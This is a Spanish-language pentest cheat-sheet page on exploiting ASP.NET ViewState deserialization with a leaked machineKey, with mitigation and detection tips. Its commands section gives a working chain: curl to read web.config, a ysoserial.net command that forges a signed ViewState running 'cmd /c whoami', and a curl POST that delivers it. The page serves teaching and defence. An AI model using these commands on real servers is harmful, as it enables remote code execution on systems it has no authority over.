---
topic: ASP.NET — ViewState y machineKey
tags: [windows, aspnet, viewstate, machinekey, deserialization]
---

# ASP.NET — ViewState y machineKey

[🌐 English](aspnet-viewstate-machinekey.en.md) | **Español**

## Concepto

ASP.NET guarda el estado de los controles en un ViewState firmado y, a veces, cifrado. Si `web.config` filtra `machineKey`, se pueden firmar ViewState arbitrarios con las claves del servidor. El ViewState se deserializa y puede ejecutar código mediante gadgets de .NET.

## Cuándo aplica

- La aplicación usa Web Forms y ViewState habilitado.
- Se puede leer `web.config` o recuperar `validationKey` y `decryptionKey`.
- El servidor acepta ViewState firmado sin MAC adicional.

## Procedimiento

1. Leer `web.config` mediante LFI, backup o subida de `.shtml`.
2. Extraer `validationKey`, `decryptionKey` y algoritmos.
3. Generar un ViewState con `ysoserial.net`.
4. Enviarlo a la página vulnerable y comprobar la ejecución.

## Comandos

```bash
# Leer web.config
curl -s "http://<HOST>/view.shtml"
# Generar ViewState firmado
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --path="/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<KEY>" --validationalg="SHA1" --validationkey="<KEY>"
curl -s -X POST http://<HOST>/default.aspx --data-urlencode "__VIEWSTATE=<PAYLOAD>"
```

## Variantes

- Usar el gadget `TypeConfuseDelegate` o `ObjectDataProvider`.
- Firmar solo si `enableViewStateMac` está deshabilitado.
- Combinar con un padding oracle para recuperar la clave.

## Limitaciones

- `machineKey` rotada invalida el ViewState generado.
- El gadget debe existir en el runtime del servidor.
- IIS puede rechazar ViewState sin MAC.

## Mitigación

- Rotar `machineKey` y no exponer `web.config`.
- Deshabilitar ViewState cuando no se use y validar el MAC.
- Bloquear `.shtml` y revisar la deserialización.

## Detección

- ViewState que no empieza por el formato esperado.
- Peticiones con ViewState muy grande o repetido.
- Procesos de IIS que lanzan `cmd` o PowerShell.

## Referencias

- [Microsoft — machineKey](https://learn.microsoft.com/en-us/iis/configuration/system.web/machinekey)
- [ysoserial.net — GitHub](https://github.com/pwntester/ysoserial.net)
- [0xdf — Perspective](https://0xdf.gitlab.io/2022/10/15/htb-perspective.html)
